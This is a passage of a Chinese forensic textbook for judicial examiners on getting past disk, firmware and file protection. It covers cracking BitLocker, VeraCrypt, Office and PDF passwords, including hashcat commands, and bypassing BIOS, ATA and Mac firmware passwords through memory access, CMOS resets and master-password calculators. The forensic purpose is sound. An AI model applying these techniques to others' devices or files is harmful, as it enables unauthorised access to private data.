![](images/7b1618e236969b42c701b2f89672ffa67084e4adfbe31b8d6de5b8dbcac3d8ff.jpg)  
图18-27 编辑keynew.BEK件并替换尾部32个字节

![](images/3c706ad7862aac54db6b92277569c53b20f9ac1a00eec1101faf113c9384df9c.jpg)  
图18-28 使BEK件解密BitLocker加密卷

## （六）BitLocker密码破解及绕密取证

BitLocker是MicrosoftWindows系统提供的种全卷加密功能，它旨在通过为整个卷提供

加密来保护数据。

## 1.常规BitLocker密码破解

BitLocker采用了强度加密AES算法，可使用开源软件Hashcat、俄罗斯PasswareKitForensic、俄罗斯Elcomsoft Distributed Password Recovery(EDPR)和美亚极光解密系统等密码恢复软件进密码破解。为了提破解效率，推荐使用性能GPU显卡或专业加速硬件卡（如FPGA、ASIC芯片)提升破解效率。

以Hashcat具为例介绍BitLocker加密卷破解基本过程。要破解BitLocker加密先要通过John the Ripper具集中的bitlocker2john具提取BitLocker加密卷的密钥信息。参考命令为：bitlocker2john.exe -i F:\BitLocker\mybitlocker.vhd。

Bitlocker2john工具通常提取到4个密钥信息字符串，分别带有\$bitlocker\$0、\$bitlocker\$1、\$bitlocker\$2和 \$bitlocker\$3前缀，如图18–29 所示。通常可将 \$bitlocker\$0 或\$bitlocker\$1前缀的密钥信息串复制出来,将其粘贴到个空的记事本件中。运Hashcat对密钥信息进破解，可采密码字典、暴破解等式进破解。

![](images/5f665c35ffe4343f66875d175aaef57ce3d290a8dd33bac01a66983d306b9041.jpg)  
图18–29使用Bitlocker2john提取BitLocker加密卷的密钥信息

## 2.基于TPM芯片的BitLocker临机绕密

司法鉴定人员可使用专用临机绕密取证设备，通过M.2NVME固态硬盘、无线网卡（M.2A+EKey）、miniPCIe及PCIe等插槽直接内存访问机制实现直接读取目标计算机物理内存并制作物理内存镜像，后续可通过相关内存分析具提取BitLocker解密所需的密钥。通过此类设备，也可直接获得BitLocker的恢复密钥，鉴定员可直接使计算机鉴定分析软件加载加密的磁盘镜像件，输BitLocker恢复密钥，即可解密BitLocker加密卷。

在开展临机绕密取证工作时，应注意保护原始电子数据，鉴定人员应尽量先对检材计算机内置的硬盘进镜像，并使用硬盘复制机将源盘克隆全盘数据至相同接口的硬盘（硬盘型号、容量尽量保持致）。进临机绕密取证时，推荐使克隆出的硬盘副本进操作。

前主流的笔记本电脑通常带有M.2NVME硬盘接口及M.2无线网卡（A+EKey）。因此，推荐使此两种接开展临机绕密，如图18-30所。

![](images/51799f8981a7c5346b7e5d61138756c1e84630a25c1119589f7f0c35bf02ffbf.jpg)  
图18-30 通过替换线卡接接入专设备并开展临机绕密

值得注意的是，近年来部分笔记本电脑厂商开始将无线网卡集成到主板或采用专用接口模块（如配套射频CRF模块），如遇到此类情形，可考虑通过M.2NVME硬盘接开展临机绕密取证。

部分新型笔记本电脑内置两个M.2NVME硬盘插槽，如存在一个未使用的插槽，通常可直接使临机绕密设备的专卡进绕密。如标电脑仅存在个M.2NVME硬盘插槽且原硬盘已占，则需通过一分二的M.2NVME扩展卡进接口扩展，如图18-31所示。

![](images/620c6f43d9125823ddb29524a2551acbc8af3999dca4fe6948b688dee691df9b.jpg)  
图18-31 通过NVME硬盘接口接入专用设备并开展临机绕密

通过临机绕密取证设备搭配的专用软件，将专用卡与目标电脑接口连接好后，选择系统版本、标机类型及数据读写式后,即可快速扫描标计算机的物理内存,通常仅需要分钟即可完成扫描并成功绕密，如图18–32所。通过命令提示符窗，输命令及参数，如mange-bde-protectors-getC：即可查看BitLocker恢复密钥信息。

![](images/edea6fb6c3600140db76d8c764356e4cce5ddd42f4775ee79494df801bd90536.jpg)  
图18-32 Windows解密与物理内存分析工具成功绕密

## 二、FileVault加密卷破解

## ()FileVault概述

FileVault(件保险箱）是苹果计算机操作系统macOS内置的种数据加密机制或功能。FileVault最早出现应用于MacOSXPartner（10.3）系统版本，早期版本仅支持加密用户目录，不持对启动卷进加密。MacOSXLion(10.7)版本开始，苹果公司推出了第代FileVault版本（FileVault2件保险箱），持将整个macOS系统启动卷进加密。

在macOS系统菜单中选择“系统偏好设置”,在“安全性与隐私”中找到“FileVault”或“件保险箱”。启动FileVault功能，系统要求户设置个主密码，当户忘记密码时，可使该主密码或是恢复密钥直接解密件。FileVault恢复密钥可当作是备份钥匙，当户忘记FileVault主密码时,可通过该恢复密钥来解锁磁盘。FileVault恢复密钥的格式为：xxxx-xxx-xxxx-xxxx-xxxx-xxxx,由大写字母和数字组成，如图18-33所示。

![](images/658c2f670a8cca26e97665ebd5681c5b500fffdf46ab284d5301d95b3c3a33bf.jpg)  
图18-33FileVault 恢复密钥

第代FileVault加密机制存在一定的缺陷或不，采CBC模式，RSA1024或3DES-EDE算法容易被破解，FileVault加密的数据就可能被解密。FileVault2开始采了XTS-AES加密算法，大幅提高安全性。FileVault2使用用户登录密码作为加密令牌，以XTS-AES模式将数据划分成128位的块，同时成1个256位密钥来加密磁盘，该标准也是美国NIST推荐的标准。

当户忘记密码时，可通过以下式解锁磁盘和重设密码：

·如果系统是OSXYosemite或更版本，可选择使iCloud账户来解锁磁盘并重设密码。

•如果系统是OSXMavericks，可选择通过Apple来储存文件保险箱恢复密钥，方法是提供三个安全提问题的问题以及答案。请选取您肯定可以记住的答案。

·如果不想使iCloud件保险箱恢复密钥，可创建个本地恢复密钥。请将此密钥的字母和数字保存在加密启动磁盘以外的其他安全位置。

## (二)FileVault 加密卷密码破解

PasswareKitForensic(PKF)是俄罗斯款于加密档、哈希、加密磁和各种系统户等综合密码破解系统，持GPU硬件加速，持分布式破解。支持10多种加密磁盘的破解，包括 FileVault/APFS、BitLocker、VeraCrypt、TrueCrypt、McAfee Endpoint、Dell Data Protection、LUKS、Symantec/PGP WDE、DriveCrypt 和 Mac T2等。

在Passware软件的主界中选择“FullDiskEncryption（全盘加密）”，然后可从中选择要解密的类型。

选择待解密的磁盘镜像，支持dd、E01、Ex01、AFF4等证据文件或虚拟磁盘文件。完成后，可选择磁盘分区（DiskPartition），从下拉列表中可以选择带有“encrypted”的分区进解密。在“Decryptedimage（解密镜像）”设置选项中可根据实际需要选择，通常可使默认的“Createadecrypted image（创建解密镜像）”。最后选择“Destination file（标件）”的存储路径。Passware将显系统中存在的户名，可选择暴破解密码并解密。如存在多个户或个恢复密钥（Personalrecovery），将会全部显示出来。

设置密码破解策略，可选择“UsePredefinedSettings（使用预定义设置）”、“RunWizard（运行向导）”和“Customize Settings（自定义设置）”。选择“Customize Settings（自定义设置）”后，显的是Passware默认提供的破解策略，可根据实际需要进调整（增加或删除）。配置完成后，选择“RECOVER（破解）”即可，如图18-34所示。破解过程查看“Resources（资源）”，可查看CPU、GPU显卡等资源对应的密码破解性能。

## 三、VeraCrypt加密数据破解

VeraCrypt[157]是款免费开源跨平台的实时磁盘件加密具,是基于知名的开源加密具TrueCrypt项衍来。由于TrueCrypt已在官上宣布其不安全并已停开发，因此开源跨平台的VeraCrypt顺理成章成为家公认的最佳件加密具新选择之。

VeraCrypt不需要成任何件即可在硬盘上建虚拟磁盘，户可按照盘符进访问，所有虚拟磁盘上的件都被动加密，需要通过密码来进访问。TrueCrypt提供多种加密算法，包括：AES–256、Blowfish（448-bit key）、CAST5、Serpent、Triple DES及Twofish,其他特性还有持FAT32和NTFS分区、隐藏卷标、热键启动等。

![](images/02cdd0c75f6ac8097140ae576963c3d7d69ecaa8aecdc7f7b404fc59a4d69068.jpg)  
图18-34选择破解设置(Attack Settings)

## (）使暴破解的式破解加密磁盘

运PasswareKitForensic密码破解软件,在主界选择“全盘加密”。选择“VeraCrypt”类型,在解密磁盘界选择VeraCrypt。添加解密件和恢复内容。选择“定义配置”解密式。设置破解策略，如图18-35和图18-36所。

![](images/c7e95681de663efd5dfaab5a08b02c1604d6984641c076770f6c4164c852840a.jpg)  
图18-35 设置破解方式为暴力破解

![](images/e691e7794b96c5516f5c2de7cb3c23012f69c2e20bd35808d2db25481af29629.jpg)  
图18-36成功解密并查看破解出的密码

## （二）使用字典破解的方式破解加密磁盘

定义破解设置，添加字典破解，如图18-37和图18–38所。

![](images/6160ed660e3dc733c20750120dd909646bfe81f735c964227bc9a8d720490565.jpg)  
图18-37 添加字典破解

![](images/e30d6e51325ebd7ed8ec156e5b21d0dba8e55bb7c52d345b3f52451edf8e2df2.jpg)  
图18-38 字典成功解密

## （三）借助物理内存镜像进解密

当VeraCrypt加密卷已被挂载起来，此时计算机的物理内存中就存在解密密钥。因此在进密码破解时,如已获得涉案电脑的计算机物理内存镜像，可选择“我有内存镜像件”的模式，选择内存镜像件，点击解密，如图18–39和图18–40所。

![](images/a69172a358a65ab197fd8a4edcf8e36b459fa41777b2b8078634f3923ae19d8a.jpg)  
图18-39 解密选项界面

![](images/dbb54b9dcc21db16478ff11815720dd587667744d911f868e16be8bea5affd96.jpg)  
图18-40成功解密

## 第三节 固件密码破解

## 一、BIOS密码

基本输输出系统（Basic InputOutputSystem,BIOS)是被固化在只读存储器（CMOS芯)中的程序，为计算机提供了最基本最直接的硬件控制。在开机时，BIOS程序动运，对计算机各硬件进检测和初始化，以确保系统能够正常作。BIOS保存有关计算机系统最重要的基本输输出程序、系统信息设置和开机检程序(POST)等信息。

不管是台式机还是笔记本电脑，BIOS程序均可设置密码保护。通常BIOS可设置管理员密码和户密码。管理员密码可于保护BIOS的设置不能随意修改，户密码只能于进BIOS查看配置或进份验证。

## (）电池放电/跳线或按钮清除CMOS

台式计算机的主板通常内置跳线或开关可直接清除CMOS数据，此外由于台式机通常使纽扣电脑为BIOS持续供电，以便能长期保持内部时钟的准确性。因此，台式计算机也可通过移除纽扣电池进断电，断电后CMOS数据将会丢失，相当于重置为出厂默认设置。

台式机电脑BIOS密码保护的移除法：关机并断开电源后，拆开机箱，将主板上的纽扣电池取下，等待1\~2分钟，再将纽扣电池重新安装至原位置。部分主板提供了BIOS重置的功能跳线或按钮（周边通常标有CLRCMOS或CLRTC），如图18–41所。

如果跳线只有两个针脚(PIN)，可直接使螺丝刀或导体短触两个针脚5\~10秒，即可使其短路清除CMOS数据，如图18–42所。如存在三个PIN，默认情况，盖帽连接针脚12是正常状态，连接针脚2—3是短路(清除CMOS)。采用按钮形式的开关，则直接按压按钮5\~10秒即可清除CMOS。部分主板同时提供了CLRCMOS跳线和按钮。

![](images/611cc6656ceb0a0284a93f5dc3305d42c33f01a382ed9819fd3efc350e58c397.jpg)

![](images/393711acb7e61c683fedd380a9d6ab0b7e377189d3418f7fa0f3e5a954b89c9f.jpg)

![](images/d8a767627b22248d834875ec83bdf12da22f97d6c8171695bbe962b553314862.jpg)

![](images/9ccc64f5f2d29b8f9c1475df6681ca9ad2e5a14162546b47378db67282bb4070.jpg)  
图18-41CMOS电池、跳线及按钮开关

![](images/c1ade04f5a81545661682d194679a5e00f97af58c3680a22dfd093caf5dc1094.jpg)  
图18-42 使螺丝刀将两个针脚进连接(清除CMOS信息)

笔记本电脑同样也有内置电池，然较多笔记本电脑是通过电源线将电池与主板的接进行连接。越来越多的笔记本电脑使用主板上的电容为CMOS供电，不方便直接拆卸。因此笔记本电脑较难像台式电脑样，直接移除电池放电或通过主板提供的跳线或按钮来清除CMOS信息，如图18-43所示。

![](images/d85e4abfd0b2c6affc772a537bfdc628f5e1502286e45cb47538dd0cc2ac9e38.jpg)  
图18-43笔记本CMOS电池(带延长线）

大多数涉案的检材即使有设置BIOS密码，无法直接进系统，在没有使用TPM加密芯的情况下，可直接拆卸硬盘进行证据固定，无须研究BIOS密码破解方法。然而，多数内置TPM芯的电脑默认启了设备加密（DeviceEncryption），实际上是种基于TPM芯的BitLocker加密，BitLocker密钥直接存储于TPM芯片中。遇到带有TPM芯片的电脑检材，不能采用拆卸硬盘进行硬盘复制或制作镜像的方法，需使用专用的免拆机鉴定设备，通过外置存储介质引导盘进行启动，才能有效制作出解密状态的磁盘镜像。然而，一旦电脑设置了管理员密码，不了解该密码就无法通过外部存储介质进启动，因此，此类场景就需要破解或计算出BIOS密码，才能进步开展证据固定作。因此BIOS的开机密码定程度上会影响对涉案检材的证据固定，可能导致无法正常开展数据获取工作。

## （）DEBUG命令重置CMOS

如计算机内置的操作系统可正常进入，则可通过DOS命令来清除CMOS数据。通过FreeDOS启动盘启动，通过cd freedos\bin进入目录，然后输入debug,执行完成后输入-o702E并按回车，再输-o71FF并按回车，最后输-q退出，即可清除CMOS数据，从而移除BIOS密码。

Debug工具在Windows7、Windows8/8.1、Windows 10和Windows 11 中默认均不提供，此外Windows64位操作系统均法执debug程序。因此，般需要通过FreeDOS或其他DOS启动盘来引导，使用32位的debug程序来清除CMOS。该方法仅适用于BIOS设置了密码，但是每次开机并未要求先输BIOS密码，且允许通过USB设备启动该计算机。

该BIOS密码清除法也适于VMware虚拟机。在VMware虚拟机中，通过F2快捷键或通过顶部菜单选择“虚拟机”-〉“电源”-〉“打开电源时进入固件”，进入BIOS并设置Supervisor或User 的密码。FreeDOS引导系统可通过https://freedos.org/下载，VMware 虚拟机中可直接将ISO作为引导盘启动，如图18–44所示。

![](images/e82616b530dcb4861ea7c496ff3ea4549a6c7bf9ebb9c80b6eb52dec7e10a202.jpg)  
图18–44 User和Master密码已被清除

## （三）基于硬件信息的BIOS密码计算

部分电脑商针对部分笔记本电脑机型为其客户提供了BIOS密码重置的技术持服务。戴尔（DELL）、索尼（SONY）、康柏（Compaq）、惠普（HP）、三星（Samsung）和富（FujitsuSimens)等多种品牌电脑均可通过设备系列号(SerialNumber)或服务编号(ServiceTag)进计算出商预设的BIOS主密码。因此，可看出户设置的BIOS密码可使外，电脑商实际上在出时，通过专门的具预设了1个或多个BIOS管理密码。

服务编号（ServiceTag）带有E7A8、BF97、1D3B、6FF1、1F66、1F5A、3A5B以及BIOS密码输界带有“提编号（HintNumber）”的部分戴尔电脑可通过计算器算出BIOS的通密码。记录屏幕上显的代码，并通过BIOS密码计算机或在线BIOS密码获取站点获得该设备的主密码（Master Password）。可通过站https://bios-pw.org/或https://biospassword.eu/查询对应设备的BIOS主密码，如图18–45所。可在BIOS密码输窗输密码ebLfDxrCpiOBzBOC，然后按住左侧的CTRL键盘，并快速连续按两次回车。如果操作不当，法进入，需要重新启动电脑，重复操作。

![](images/43239f74bcf253c0fdd1886e4d82499eba1e9185307b051f6e1cecd80d6fc9ea.jpg)  
图18-45输入代码计算出BIOS开机密码

## （四）基于芯编程器的绕密

通过芯编程器来读取CMOS或苹果EFI芯数据，找到固件密码所在位置并进清空，将数据回写到芯中。不同的计算机主板的CMOS和EFI芯接存在定差异，因此需要购买相应的转换适配器。

使用芯编程器直接读写芯中的数据是较为通的BIOS/EFI绕密法，如图18-46和图18-47所。此种法存在定的风险，一旦数据更改错误，可能造成芯法正常作。因此建议需先提前备份芯中的所有数据。

![](images/2ed7224b2d64a12189a712f94228ea95e08b4090bcb0d0cc81d993ba6f6b1541.jpg)

图18-46 芯编程器及转换板卡  
![](images/c173c0faa2ad7198cb7506e530b6e33484782b52c9846630390461fe069dde6d.jpg)  
图18-47 芯编程器读写CMOS数据

## （五）基于定制内存条的绕密

部分笔记本电脑可通过特殊的式进BIOS绕密，ThinkPad笔记本部分机型可通过购买特殊定制的内存条，开机后直接实现BIOS绕密，如图18-48所。

通过此法，只需要拆开内存盖，插到ThinkPad笔记本电脑的内存槽。原笔记本电脑需至少有两个内存槽，一个用原有内存条，另外一个内存槽插定制用于解密的内存条，按开机键，开机秒后即可动清除BIOS密码。

![](images/34d2886ccda3a5999f366c449550bfa0fb0b267d32ccc306123e3b038a07fb92.jpg)  
图18-48 ThinkPad专BIOS绕密内存

以下是BIOS绕密内存条持的ThinkPad笔记本型号：

•X201、X220、X220T、X230、X100e、X121、X131、X131e

• T401、T420、T430、T430s、T520、T530

• W510、W520、W530

• E30、E40,E50、E420、E425、E430、E450,E431、E531

• L412、L420、L512、L421、L520、L430、L440、L450

## 二、硬盘密码（ATA加密）

1997年，ATA-3规范正式发布。硬盘持加密以保护数据安全[4。可通过BIOS或软件来设置硬盘密码。提供两种安全级别设置，包括High（）和Maximum（最）。级别类密码可User或Master密码进解锁，最级别只能Master密码进解锁。

在BIOS设置中，通常可在“安全(Security）”中找到关于硬盘密码设置的选项,如图18–49所。在部分商务型笔记本电脑的BIOS通常提供了设置硬盘密码的选项，在多数的台式机电脑中，一般没有提供此功能选项。实际上，不管是机械硬盘还是固态硬盘，通常支持ATA-3规范，就能持设置访问密码来保障硬盘数据的安全。

![](images/32e4f69aaf869b3089fd774835b1d3d511a6e44eefe2ca6443ae51c3ac21810b.jpg)  
图18-49 BIOS中设置硬盘ATA密码

完成硬盘的密码设置后，每次开机均要求用户先输正确的硬盘密码。未输正确密码前，硬盘中安装的操作系统不会进加载。不同品牌的笔记本电脑，硬盘密码输界提示存在差异，如图18-50所。

![](images/efb93c7a53584e296750921beacaabd9bea0b4bd4b16c69a812e40a6a16813fe.jpg)  
图18-50 开机后硬盘密码输入界面

在司法鉴定过程中对送检的检材进行证据固定时，如将内置的硬盘拆卸下来并使用硬盘复制机制作硬盘，如遇到硬盘无法进行数据读取，应首先检查该硬盘的健康状态，并检查硬盘是否设置了ATA密码。

鉴定可采ATOLAInsight、PC-3000UDMA/PC-3000Portable或MRT等硬盘预检设备进硬盘基本状况的分析，如图18-51所。如发现硬盘设有ATA密码，则需对该密码进正确处理。常见的ATA加密硬盘的处理式有两种：①直接读取硬盘密码;②备份硬盘完整固件，移除固件中的密码，提取硬盘数据，最后再将备份的固件还原。

![](images/a6ae11c2cb782e33b6cd3b8ce0fe0f037c7ae8d205cf4962687a7a5af4d525d0.jpg)  
图18-51常用硬盘ATA密码提取和破解设备

## （一）直接读取硬盘密码

AtolaInsight密码动移除功能可直接从硬盘的固件区提取原始密码。只需点击下鼠标，就会自动读取出密码，如图18–52所示。

![](images/6f01763e96c6e136bf7262000d5e7595852739e62c440c573719c1c1beea571e.jpg)  
图18-52 读取已提取的硬盘ATA口令

## （二）将固件中的硬盘密码移除

移除ATA加密硬盘的密码并不会影响硬盘数据的哈希校验，因为硬盘密码是存储于硬盘固件区域。通过“重置令”将优先提取原始令，如图18-53所。如失败，系统将移除原有的令。移除硬盘令后，即可使硬盘复制机、只读锁等设备对硬盘进证据固定或读取数据。

![](images/8e3a67b33afd272b800a2082c138a3cabed6c55c8ca9c38d59df17f23f947700.jpg)  
图18-53重置口令

## 三、Mac电脑固件密码

苹果公司的Mac电脑有不同的系列和型号，包括MacBook、MacBookPro、MacBookAir、MacMini、iMac、MacPro等。Mac电脑与常见的其他品牌电脑的硬件上存在些差异，较典型的是Mac电脑没有BIOS，取而代之的是EFI(ExtensibleFirmware Interface），即扩展固件接。通过EFI固件程序可设置开机密码和SecureBoot。苹果公司官站将开机密码称为固件密码(FirmwarePassword)，业界不少也将其称为EFI密码。固件密码就是类似BIOS密码，于保护固件程序的安全。在电数据司法鉴定实践中，旦遇到设有固件密码的Mac电脑设

备，需掌握正确的处理方法。

Mac 电脑要设置固件密码，需要通过恢复模式进行配置。基于Intel处理器的Mac电脑，可按开机按钮后长按快捷键Command + R,而基于Apple 芯片的Mac 电脑，需将Mac 开机并继续按住电源按钮。在出现实用工具窗口时，点按菜单栏中的“实用工具”，然后选取“启动安全性实用工具”或“固件密码实用工具”。点按“开启固件密码”。在提供的栏位中输固件密码，然后点按“设置密码”。

一旦设有固件密码，后续每次开机均需要先输入该密码。该密码可保护macOS系统的安全，禁止通过外部USB设备进行启动。因此，在检验Mac 电脑时，可通过长按Option 键进行检查是否设有固件密码。如设置了固件密码，系统将会出现固件密码输入界面。由于Mac电脑不同年份生产的硬件存在差异，早期版本(2010\~2015)的Mac电脑，可通过拆卸硬盘进行数据获取，因此，无须对固件密码进行处理。

## (一)移除电池清除固件密码

2006年2010年期间苹果公司发的Mac电脑的固件密码般可通过移除电池、重置PRAM 3次或移除RAM来移除。

## （二)专用设备解除固件密码

## 1.Mac电脑发行年份(2011\~2017)

2011年至2017年期间苹果公司发行的Mac电脑的固件密码存储于主板上的一个芯片，也可将其称为EFI芯片。该芯片直接焊接在主板上，常用的是WinBond厂商芯片，其作用与CMOS芯片相似，如图18–54所示。

![](images/caae28ffc4605e8a8b44cb9ee120c45be3cfd27b8eb2d0ac2433e4128d919259.jpg)  
图18–54 Mac电脑EFI芯片

可通过专门的设备（如EFIBIOSMaster)对固件密码进行破解，也可通过将EFI芯拆下来，使用芯编辑器进行读取和移除数据，再将芯片焊接回原有主板。此外，还可联系苹果公司获得技术支持，如图18-55所示。

EFIBIOSMaster设备可删除和解锁苹果Mac电脑（2010\~2017)固件密码，只需将线缆连接到连接器或将SOIC8夹子连接到EFI芯片，然后打开解锁装置，仅需15秒左右即可自动解锁，无须具备焊接芯片的技能，如图18–56所示。

## 2.Mac电脑发行年份(2018\~2020)

苹果公司于2018年开始，对Mac全系列电脑均增加了T2安全芯。T2芯内置一个独立的BridgeOS 操作系统。针对内置T2芯Mac 电脑固件密码，可使用Passware Kit Forensics、CheckM8 EFI Unlock Software、iRemove Tools 或 MacUnlocker 等工具清除和重置固件密码。

![](images/93df6beb3f56d812d9311ff99cba35849401f259f1fb335bf05357f9084695cd.jpg)  
图18-55 EFI BIOSMaster解锁设备

![](images/6eadd5bf2de70b302caa6acd55e1b8988e68b29912c5db00fb81c11fc859abb4.jpg)  
图18-56 连接EFI芯并读取数据

关闭Mac电脑，针对MacBookPro/Air系列电脑，可按快捷键Ctrl（左）+Option(左）+Shift（右)+电源开关组合键8秒左右，即可进DFU模式,如图18-57所。

![](images/d9c10fd3c12d871ce7f8dd9d30e82fa91746faf9f5dd1d02b436b583199aa6d7.jpg)  
图18-57 主机连接并进入DFU模式

## 第四节 加密文件类破解

## 一、Office档破解

## (）Office档概述

多数户办公、学习等场景下均需要使Office办公软件。前市场上主流的办公软件有微软Office、Open Office、WPSOffice及永中Office等。由于微软Office较的市场占有率，多家Office软件开发商均兼容持微软的格式。

微软Office包含了Word、Excel、PowerPoint和Outlook四组件。Office97\~2003版本采了同种件格式，持的加密算法也基本相同。2007年后微软推出新的Office2007格式,默认采OpenXML格式，其件扩展名也做了重调整。原有Word档的扩展名从doc变为docx,Excel文档扩展名从xls变为xlsx。此外,Office2007及以上版本的文档加密机制与早期Office97\~2003版本也差异较大。

微软文档支持的保护机制分为三大类，可分为打开密码、修改密码和表单密码。顾名思义，打开密码就是打开文档必须输的密码，没有这个密码，文件内容就无法查看。设有修改密码的档，必须输该密码，才能对件进内容修改。表单密码则是用于保护档的局部信息或内容，受保护的部分内容要进行修改，必须先输入表单密码。通常知道打开密码，使用密码破解工具，就可破解出修改密码和表单保护密码。因此打开密码是Office档最重要的安全保护机制。

## (二)彩虹表破解Office文档

除密码保护外，与文档安全相关的要素还有支持的加密算法。早期的Office97\~2003文档默认采用RC4(128bit)加密算法，加密强度不高，存在一定的安全隐患。目前，Word、Excel(97\~2003版本)均可通过彩虹表进快速解密并移除密钥，通常30分钟以内可快速解密文档，密码破解软件是直接攻击破解密钥，从实现直接解密出原有数据。该式并破解出原始密码，而是直接破解密钥，并将加密文档进行解密。

运行Advanced OfficePassword Breaker，选择“Options（选项）”。配置彩虹表破解参数（Rainbow attack），一个选项是Word 彩虹表的路径，另一个则是Excel 彩虹表的路径。点击“Open（打开）”，选择待破解的EXCEL文档，点击“Start！（开始）”即可启动破解任务。通过彩虹表查询，软件在2分钟以内查找到对应的密钥，选择“Decrypt（解密）”即可导出一个解密数据后的版本，如图18–58所示。

![](images/d4b76d573d9dfb612e02ac095ee6c78c7a95026782089e11ec3a3eafe67ce289.jpg)  
图18-58成功破解文档加密密钥

## (三)Office 文档密码破解

在检验分析过程中，如需对微软Office文档（非RC4加密算法）解密，不能采用基于彩虹表方式的解密，只能通过密码破解软件进破解。破解方式可根据实际情况进选择，如字典破解、暴力破解、基于已知部分密码的破解或掩码破解及多种组合方式联合破解等。

不同的Office档密码破解具易性和破解性能存在一定差异，鉴定可根据鉴定所配置的设备开展密码破解工作。支持Office文档密码破解的工具比较丰富，常用的有Hashcat、 Passware Kit Forensic、Elcomsoft Advanced Office Password Recovery/DistributedPasswordRecovery及美亚柏科“极光”解密系统等。

对于加密强度较高的加密文件，建议配备一定数量的硬件加速卡（Nvidia高性能显卡）或FPGA 硬件加速卡。如没有专门的密码破解硬件，可考虑使用多台鉴定实验室的计算机的CPU+GPU处理器并采用分布式方式共同破解一个任务，从而增加密码破解所需的运算能力，最终提升破解的成功率。

## 1.使用 Hashcat 破解 PowerPoint 文档(字典破解)

需先使用office2hashcat.py 脚本提取文件的哈希信息，然后再用Hashcat进行密码破解。

语法：office2hashcat.py sample1-powerpoint.pptx > sample1-powerpoint.hash

如鉴定工作站安装了多个不同版本的 python，可在脚本前加上要使用的python.exe的具体路径，例如 C:\Python27\python.exe ofice2hashcat.py。Office2hashcat.py 提取文件哈希信息后，正常执行情况下，不会有任何显示，但是在目录下会生成一个文件。通过记事本或文本编辑器工具查看该文件，可了解该文件是由具体哪个Office版本生成，如图18–59所示。

![](images/2a25d2c8b004d78811dae89e91b31f4b7e496dd6aa1396f28a01fe1f14d92ce1.jpg)  
图18- 59提取的密钥信息内容

根据Hashcat的参数说明，可找到Office2013对应的代码为9600，如图18-60所示。语法：hashcat.exe -m 9600 sample1-powerpoint.hash rockyou_dict.txt

![](images/9137259b160bf0ac9fabb8eb4a86880b1c378fc57f786b5048ccd887829eb821.jpg)  
图18-60查看Office文档类型对应的代码

启动Hashcat进行破解，破解成功即可看到Status为Cracked，破解出的密码一般在原有的哈希字符串后，如图18-61所示。 请勿商用。

## 2.使用 Hashcat 破解 Excel 文档(暴力破解，指定字符集)

使用 Hashcat破解 Excel文档与破解 PowerPoint文档过程相似，破解前需要先用

![](images/ac8263006316af96d59983b83c3141d24228bef93fb984ed023df54942c19f0f.jpg)  
图18-61 破解结果

office2hashcat.py脚本提取件的哈希信息，然后再Hashcat进密码破解。

语法：office2hashcat.py sample2-excel.xlsx>sample2-excel.hash

使Hashcat暴破解规则来破解此Excel加密件的密码。（提：该件密码长度不超过6位，包含写字母和数字）。

语法：hashcat.exe -m 9600 sample2-excel.hash -a 3?h?h?h?h?h?h -increment --incrementmax=6

## 字符集范围：(Hashcat使？字母来指定字符集范围)

字母1：abedefghijklmnopqrstuvwxyz（写字母）

字母u：ABCDEFGHIJKLMNOPQRSTUVWXYZ（写字母）

字母d：0123456789 （数字）

字母h：0123456789abedef （写+数字）

字母H：0123456789ABCDEF（写+数字）

字母s：!"#\$%&()\*+,./：;<=>?@[\]^_{1}\~

字母a:?1?u?d?s（涵盖所有写字母、写字母、数字及特殊字符）

## 二、PDF档破解

## (）PDF档概述

便携档格式（PortableDocumentFormat,PDF)是种独于应程序、硬件、操作系统的式呈现档的件格式。每个PDF件包含固定布局的平档的完整描述，包括本、字形、图形及其他需要显示的信息。PDF档除文本和图形外，还可包括逻辑结构元素，注释、表单、图层、富媒体之类的交互元素以及多种其他数据内容。PDF规范还提供了加密和数字签名等功能。

PDF档可设置两种密码，一种是打开密码，另种是许可密码(PermissionPassword）。打开密码是打开件的最重要的要素，否则就法打开PDF件。PDF档的安全性与其使用的加密算法息息相关。早期的PDF版本使用的是RC440位加密算法，属于一种弱加密算法。俄罗斯密码破解软件公司Elcomsoft研发了针对PDF文档(RC440位)的彩虹表(ThunderTable)，可实现快速对加密的PDF档进解密。PDF档采用的加密算法也不断进化，后来相继采用了RC4128、AES128和AES256等加密算法，提升了文档内容安全保护的能力。PDF文档的不同版本使用了不同的加密算法，见表18–3。

表18-3常见的版本及对应的算法
<table><tr><td>Acrobat 版本</td><td>PDF格式版本</td><td>加密算法</td><td>最大密码长度及编码</td></tr><tr><td>Acrobat 2 -4</td><td>PDF 1.1 – 1.3</td><td>RC440（弱加密）</td><td>32个字符(Latin)</td></tr><tr><td>Acrobat 5</td><td>PDF 1.4</td><td>RC4128（弱加密）</td><td>32个字符(Latin)</td></tr><tr><td>Acrobat 6</td><td>PDF 1.5</td><td>RC4128（弱加密）</td><td>32个字符(Latin)</td></tr><tr><td>Acrobat 7</td><td>PDF 1.6</td><td>AES-128</td><td>32个字符(Latin)</td></tr><tr><td>Acrobat 8</td><td>PDF 1.7 (ISO 32000 -1)</td><td>AES-128</td><td>32个字符(Latin)</td></tr><tr><td>Acrobat 9</td><td>PDF 1.7 Adobe Extension Level 3</td><td>AES-256（密码处理 存在缺陷）</td><td>127个UTF-8字节（Unicode)</td></tr><tr><td>Acrobat X/XI/DC</td><td>PDF 1.7 Adobe Extension Level 8</td><td>AES-256（密码处理 已改进）</td><td>127个UTF−8字节（Unicode)</td></tr></table>

如PDF文档只设置“许可密码”，则该文件不需要密码即可直接打开查看，但无法对此文档进任何编辑操作。如该档开启禁打印、禁复制等功能限制，则该档的字内容就无法复制，也无法通过打印机打印。 ADnCDD 5 2n Entarnriea Editinn

## （二)PDF打开密码破解

运行APDFPR软件，选择“Open（打开）”，选择要解密的PDF文档的路径。勾选“Use pre-computed hash tables（使用预计算的哈希表）”，并选择“Typeof attack（破解类型)”为“Key search(密钥搜索)”,然后选择“Start！（开始)”，如图18-62所示。

通常“Key search(密钥搜索）”类型是针对采用RC440位加密算法的PDF文档，可利用预计算的彩虹表(哈希表)直接快速查询密钥。通常密钥查询可在几分钟到数十分钟内成功匹配。软件将会显示“Encryptionkey successfullyrecovered（加密密钥成功恢复）”，如图18-63所示。

![](images/eacad948a93cb2adc20ae734218782763fa607837f9613a188820a35c5d8dca2.jpg)  
图18–62 打开 APDFPR 软件并设置Key Search 破解

聖業雅業引翁電等業斯業聖家在喬員的，表棋黎是在靠集整著學擊重專隆擎研集事等之用，清勿商用。

![](images/37005dfa688d86afc2144a43f2e291f8b817cc27bf2d32ef5b93613f3a053e38.jpg)  
图18-63成功破解密钥

